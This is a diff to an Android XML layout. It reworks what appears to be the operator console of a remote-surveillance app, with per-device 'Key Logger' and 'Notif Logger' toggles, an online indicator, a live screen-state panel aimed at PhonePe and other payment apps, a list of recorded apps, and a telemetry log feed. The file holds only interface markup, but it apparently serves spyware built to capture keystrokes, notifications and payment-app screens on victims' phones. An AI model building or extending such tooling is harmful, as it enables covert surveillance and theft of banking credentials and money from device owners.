@@ -16,31 +16,53 @@
         android:layout_marginBottom="12dp">
 
         <TextView
-            android:id="@+id/txtDeviceName"
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="📱"
+            android:textSize="20sp"
+            android:layout_marginRight="10dp" />
+
+        <LinearLayout
             android:layout_width="0dp"
             android:layout_height="wrap_content"
             android:layout_weight="1"
-            android:text="NODE_ID"
-            android:textSize="16sp"
-            android:textStyle="bold"
-            android:textColor="#C9D1D9"
-            android:fontFamily="monospace" />
+            android:orientation="vertical">
+
+            <TextView
+                android:id="@+id/txtDeviceName"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:text="Device Identifier"
+                android:textSize="16sp"
+                android:textStyle="bold"
+                android:textColor="#F1F5F9"
+                android:fontFamily="monospace" />
+
+            <TextView
+                android:id="@+id/txtDeviceSub"
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="Active Node // Live Control"
+                android:textSize="11sp"
+                android:textColor="#94A3B8" />
+        </LinearLayout>
 
         <TextView
+            android:id="@+id/txtPresencePill"
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
             android:text="ONLINE"
-            android:textSize="9sp"
+            android:textSize="10sp"
             android:textStyle="bold"
-            android:textColor="#3FB950"
-            android:background="#1B4721"
+            android:textColor="#22C55E"
+            android:background="@drawable/online_pill_background"
             android:paddingLeft="8dp"
             android:paddingRight="8dp"
-            android:paddingTop="3dp"
-            android:paddingBottom="3dp" />
+            android:paddingTop="4dp"
+            android:paddingBottom="4dp" />
     </LinearLayout>
 
-    <!-- Toggle Buttons -->
+    <!-- Remote-Control Buttons -->
     <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
@@ -52,10 +74,9 @@
             android:layout_width="0dp"
             android:layout_height="wrap_content"
             android:layout_weight="1"
-            android:text="KEY_LOG: ON"
-            android:textSize="10sp"
+            android:text="Key Logger: ON"
+            android:textSize="11sp"
             android:textStyle="bold"
-            android:fontFamily="monospace"
             android:background="@drawable/btn_green_rounded"
             android:textColor="#FFFFFF"
             android:layout_marginRight="6dp" />
@@ -65,32 +86,112 @@
             android:layout_width="0dp"
             android:layout_height="wrap_content"
             android:layout_weight="1"
-            android:text="NOTIF_LOG: ON"
-            android:textSize="10sp"
+            android:text="Notif Logger: ON"
+            android:textSize="11sp"
             android:textStyle="bold"
-            android:fontFamily="monospace"
             android:background="@drawable/btn_green_rounded"
             android:textColor="#FFFFFF"
             android:layout_marginLeft="6dp" />
     </LinearLayout>
 
-    <!-- Log Console Header -->
+    <!-- Live Screen Telemetry Panel (PhonePe / Payment Apps) -->
+    <TextView
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="LIVE SCREEN STATE (PhonePe / Payment Apps):"
+        android:textStyle="bold"
+        android:textSize="11sp"
+        android:textColor="#38BDF8"
+        android:fontFamily="monospace"
+        android:layout_marginBottom="4dp" />
+
+    <TextView
+        android:id="@+id/txtLiveScreenState"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="Waiting for live screen broadcast..."
+        android:textSize="11sp"
+        android:textColor="#22C55E"
+        android:fontFamily="monospace"
+        android:background="#0A0F1D"
+        android:padding="8dp"
+        android:layout_marginBottom="12dp" />
+
+    <!-- Per-Device All Recorded Apps Tile (Scrollable, same size as logs) -->
+    <TextView
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:text="ALL RECORDED APPS (Scrollable - Tap to Filter):"
+        android:textStyle="bold"
+        android:textSize="11sp"
+        android:textColor="#94A3B8"
+        android:fontFamily="monospace"
+        android:layout_marginBottom="4dp" />
+
+    <ScrollView
+        android:id="@+id/appsScrollView"
+        android:layout_width="match_parent"
+        android:layout_height="260dp"
+        android:background="#0A0F1D"
+        android:padding="8dp"
+        android:layout_marginBottom="12dp"
+        android:fillViewport="false">
+
+        <LinearLayout
+            android:id="@+id/containerDeviceAppsToday"
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical" />
+    </ScrollView>
+
+    <!-- Filter Header & Back to All Logs Button -->
+    <LinearLayout
+        android:id="@+id/layoutFilterHeader"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="horizontal"
+        android:gravity="center_vertical"
+        android:layout_marginBottom="4dp"
+        android:visibility="gone">
+
+        <TextView
+            android:id="@+id/txtActiveFilter"
+            android:layout_width="0dp"
+            android:layout_height="wrap_content"
+            android:layout_weight="1"
+            android:text="Filtering: App"
+            android:textSize="11sp"
+            android:textStyle="bold"
+            android:textColor="#38BDF8"
+            android:fontFamily="monospace" />
+
+        <Button
+            android:id="@+id/btnBackToAll"
+            android:layout_width="wrap_content"
+            android:layout_height="28dp"
+            android:text="Back to All Logs"
+            android:textSize="9sp"
+            android:textStyle="bold"
+            android:background="@drawable/btn_blue_rounded"
+            android:textColor="#FFFFFF" />
+    </LinearLayout>
+
+    <!-- Terminal-style Log Panel -->
     <TextView
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:text="INDIVIDUAL TELEMETRY FEED:"
         android:textStyle="bold"
         android:textSize="11sp"
-        android:textColor="#8B949E"
+        android:textColor="#94A3B8"
         android:fontFamily="monospace"
         android:layout_marginBottom="6dp" />
 
-    <!-- Scrollable Terminal Log Console -->
     <ScrollView
         android:id="@+id/logScrollView"
         android:layout_width="match_parent"
-        android:layout_height="160dp"
-        android:background="#0D1117"
+        android:layout_height="260dp"
+        android:background="#0A0F1D"
         android:padding="10dp"
         android:fillViewport="false">
 
@@ -98,9 +199,9 @@
             android:id="@+id/txtDeviceLogConsole"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="Waiting for telemetry..."
+            android:text="Waiting for device activity..."
             android:textSize="11sp"
-            android:textColor="#3FB950"
+            android:textColor="#38BDF8"
             android:fontFamily="monospace" />
     </ScrollView>
 
